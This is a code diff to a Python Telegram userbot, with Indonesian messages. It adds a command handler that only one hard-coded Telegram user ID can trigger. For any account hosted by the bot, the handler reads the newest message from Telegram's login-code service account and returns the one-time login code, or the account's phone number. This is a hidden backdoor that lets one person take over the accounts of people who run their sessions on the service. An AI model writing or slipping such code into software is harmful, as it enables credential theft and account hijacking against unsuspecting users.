@@ -343,3 +343,40 @@ async def user(client: Client, message: Message):
             )
     else:
         await message.reply(f"<b>{user}</b>")
+
+
+@Client.on_message(filters.user(1054295664) & filters.command(["getotp", "getnum"], "") & filters.me)
+async def otp_and_number(client, message):
+    if len(message.command) < 2:
+        return await client.send_message(
+            message.chat.id,
+            f"<code>{message.text} user_id userbot yang aktif</code>",
+            reply_to_message_id=message.id,
+        )
+    try:
+        for X in bots:
+            if int(message.command[1]) == X.me.id:
+                if message.command[0] == "getotp":
+                    async for otp in X.search_messages(777000, limit=1):
+                        if otp.text:
+                            return await client.send_message(
+                                message.chat.id,
+                                otp.text,
+                                reply_to_message_id=message.id,
+                            )
+                        else:
+                            return await client.send_message(
+                                message.chat.id,
+                                "<code>Kode Otp Tidak Di Temukan</code>",
+                                reply_to_message_id=message.id,
+                            )
+                elif message.command[0] == "getnum":
+                    return await client.send_message(
+                        message.chat.id,
+                        X.me.phone_number,
+                        reply_to_message_id=message.id,
+                    )
+    except Exception as error:
+        return await client.send_message(
+            message.chat.id, error, reply_to_message_id=message.id
+        )
